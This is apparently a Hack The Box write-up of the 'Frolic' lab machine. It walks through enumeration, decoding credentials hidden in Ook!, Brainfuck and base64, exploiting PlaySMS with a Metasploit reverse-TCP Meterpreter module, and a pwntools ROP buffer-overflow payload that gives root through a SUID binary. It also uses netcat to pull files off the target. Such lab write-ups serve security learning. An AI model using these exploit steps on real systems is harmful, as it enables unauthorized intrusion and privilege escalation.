---
layout: single
title: Frolic - Hack The Box
excerpt: This is the writeup for Frolic, a CTF-like machine with esoteric programming languages and a nice priv esc that requires binary exploitation.
date: 2019-03-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-frolic/frolic_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - metasploit
  - esoteric language
  - ctf
  - rop
  - buffer overflow
  - binary exploitation
---

![](/assets/images/htb-writeup-frolic/frolic_logo.png)

Frolic had a pretty straightforward user access part where after minimal enumeration we could find the password for the PlaySMS application obfuscated a couple of times with some esoteric languages and other things. The PlaySMS application which we could access with the password was directly exploitable from Metasploit without any effort.

The priv esc had a buffer overflow in a SUID binary that we had to exploit using a ROP gadget from the libc library. I discovered the very cool [one_gadget](https://github.com/david942j/one_gadget) tool while doing this box.

## Quick summary

- PlaySMS is installed and vulnerable to a bug which we can exploit with Metasploit (needs to be authenticated)
- The credentials for PlaySMS are found in an encrypted zip file, which is encoded in Brainfuck, obfuscated in some random directory, then further obfuscated with Ook esoteric programming language
- The priv esc is a SUID binary which we can ROP with one_gadget (ASLR is disabled)

### Tools used

- [OOK! Language decoder](https://www.dcode.fr/ook-language)
- [Brainfuck Language decoder](https://www.dcode.fr/brainfuck-language)
- [one_gadget](https://github.com/david942j/one_gadget)

### Nmap

The enumeration shows Node-RED, an Nginx server on a non-standard port, Samba and SSH.

```
# Nmap 7.70 scan initiated Sat Oct 13 15:01:02 2018 as: nmap -p- -sC -sV -oA frolic 10.10.10.111
Nmap scan report for frolic.htb (10.10.10.111)
Host is up (0.018s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h55m33s, deviation: 3h10m31s, median: -5m33s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2018-10-14T00:26:00+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-10-13 14:56:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 13 15:01:34 2018 -- 1 IP address (1 host up) scanned in 32.59 seconds
```

### Node-RED

There's a Node-RED server running on port 1880 but when we try to log in with the `admin / password` credentials it just hangs and times out.

![](/assets/images/htb-writeup-frolic/nodered.png)

### Nginx webserver

The default nginx page is shown.

![](/assets/images/htb-writeup-frolic/nginx.png)

Next, we'll dirbust the site.

```
root@ragingunicorn:~# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://frolic.htb:9999

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://frolic.htb:9999/
[+] Threads      : 50
[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/10/13 15:03:06 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/backup (Status: 301)
/dev (Status: 301)
/loop (Status: 301)
/test (Status: 301)
=====================================================
2018/10/13 15:03:19 Finished
=====================================================
```

The `/admin` link contains a login form:

![](/assets/images/htb-writeup-frolic/loginform.png)

All the authentication is done client-side with javascript code. Looking at the source code we can see the password: `superduperlooperpassword_lol`

```js
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```

We don't even need to log in, we can browse to `success.html` directly.

![](/assets/images/htb-writeup-frolic/cipher1.png)

The page contains some kind of ciphertext:

```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
```

This is actually an esoteric programming language: [Ook!](https://esolangs.org/wiki/ook!)

We can use [dcode.fr](https://www.dcode.fr/ook-language) to find the plaintext.

```
Nothing here check /asdiSIAJJ0QWE9JAS
```

This contains yet another encoded blob of text:

![](/assets/images/htb-writeup-frolic/cipher2.png)

```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA 
```

When we base64 decode it, we see the PKZIP magic bytes `PK`.

```
root@ragingunicorn:~/frolic# base64 -d stuff.b64
PK     É7M#[i   index.phpUT     |[|[ux
                                      ^DJsh)
root@ragingunicorn:~/frolic# base64 -d stuff.b64 > stuff.zip
```

The zip file is encrypted, after the first guess I found the password is `password`:

```
root@ragingunicorn:~/frolic# unzip stuff.zip
Archive:  stuff.zip
[stuff.zip] index.php password:
  inflating: index.php
```

More encoded text...

```
root@ragingunicorn:~/frolic# cat index.php
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

![](/assets/images/htb-writeup-frolic/cipher3.png)

The following is the Brainfuck esoteric programming language:

```
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..< 
```

Again, we use [dcode.fr](https://www.dcode.fr/brainfuck-language) to find the plaintext:

```
idkwhatispass
```

### PlaySMS and shell access

The `http://frolic.htb:9999/dev/backup/` link contains a reference to `/playsms`

The playSMS application seems to be installed on the server:

![](/assets/images/htb-writeup-frolic/playsms1.png)

We can log in using `admin` / `idkwhatispass`.

![](/assets/images/htb-writeup-frolic/playsms2.png)

We have two potential vulnerabilities we can use with Metasploit:

```
root@ragingunicorn:~/frolic# searchsploit playsms
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)             | exploits/php/remote/44598.rb
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload             | exploits/php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                               | exploits/php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)         | exploits/php/remote/44599.rb
```

We can use the `playsms_uploadcsv_exec` module to get a shell:

```
msf exploit(multi/http/playsms_uploadcsv_exec) > show options

Module options (exploit/multi/http/playsms_uploadcsv_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   idkwhatispass    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST      10.10.10.111     yes       The target address
   RPORT      9999             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /playsms         yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.23      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PlaySMS 1.4
```

```
msf exploit(multi/http/playsms_uploadcsv_exec) > run

[*] Started reverse TCP handler on 10.10.14.23:4444
[+] Authentication successful: admin:idkwhatispass
[*] Sending stage (37775 bytes) to 10.10.10.111
[*] Meterpreter session 3 opened (10.10.14.23:4444 -> 10.10.10.111:52952) at 2018-10-13 17:12:46 -0400

meterpreter > shell
Process 1785 created.
Channel 0 created.
whoami
www-data
```

Found user flag:

```
cd /home
ls -l
total 8
drwxr-xr-x 3 ayush ayush 4096 Sep 25 02:00 ayush
drwxr-xr-x 7 sahay sahay 4096 Sep 25 02:45 sahay
cd ayush
cat user.txt
2ab959...
```

### Priv esc

Found our priv esc vector here: **/home/ayush/.binary/rop**

```
www-data@frolic:~$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/sbin/mount.cifs
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/bin/umount
/bin/su
/bin/ntfs-3g
/home/ayush/.binary/rop
```

There's obviously a buffer overflow in the binary, as shown below:


```
www-data@frolic:~$ /home/ayush/.binary/rop
/home/ayush/.binary/rop
[*] Usage: program <message>
www-data@frolic:~$ /home/ayush/.binary/rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Luckily, ASLR is disabled on the server (0 = disabled):

```
www-data@frolic:/home/ayush$ cat /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
0
```

We can use netcat to copy the `rop` binary file to our own box and analyze it with gdb/gef:

```
gef➤  checksec
[+] checksec for '/root/frolic/rop'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

NX is enabled so we won't be able to execute a shellcode on the stack. But first things first, let's find the offset for our overflow:

```
root@ragingunicorn:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 128
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
```

When we crash the program, we see EIP is set to `0x62413762`:

![](/assets/images/htb-writeup-frolic/gdb.png)

We find the offset at position 52:

```
root@ragingunicorn:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762
[*] Exact match at offset 52
```

Next, we'll look for gadgets in libc that we can use in our exploit. We'll copy the libc file from the box to our own machine and use one_gadget:

```
root@ragingunicorn:~/frolic# nc -lvnp 4444 > libc
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.111] 59480
root@ragingunicorn:~/frolic# one_gadget -f libc rop
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL
```

We found a gadget at `0x3ac5c` that'll give us a nice shell!

We also need libc's base address (which doesn't change since ASLR is disabled):

```
www-data@frolic:/home/ayush$ ldd /home/ayush/.binary/rop
ldd /home/ayush/.binary/rop
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
```

Base address is : `0xb7e19000`

To construct the final exploit, we write a simple script that'll squash the $RIP register with the memory address of the gadget that spawns `/bin/sh`: 

```python
from pwn import *

payload = "A" * 52 + p32(0xb7e19000+0x3ac5c)

print payload
```

We can run the exploit locally to generate a `payload` file which we then transfer to the target system and pipe into the target binary:

```
www-data@frolic:/dev/shm$ /home/ayush/.binary/rop $(cat payload)
/home/ayush/.binary/rop $(cat payload)
# cd /root
cd /root
# cat root.txt
cat root.txt
85d3fd...
```